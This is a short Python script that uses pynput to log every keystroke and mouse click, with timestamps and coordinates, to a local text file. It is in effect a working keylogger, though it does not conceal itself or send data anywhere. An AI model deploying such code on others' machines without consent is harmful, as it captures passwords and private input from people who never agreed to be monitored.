from pynput import keyboard, mouse
import logging

# Configure logging
logging.basicConfig(filename='key_click_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

# Keyboard event listener
def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

# Mouse event listener
def on_click(x, y, button, pressed):
    if pressed:
        logging.info(f'Mouse clicked at ({x}, {y}) with {button}')

# Start keyboard listener
keyboard_listener =keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Start mouse listener
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

# Keep the script running
keyboard_listener.join()
mouse_listener.join()
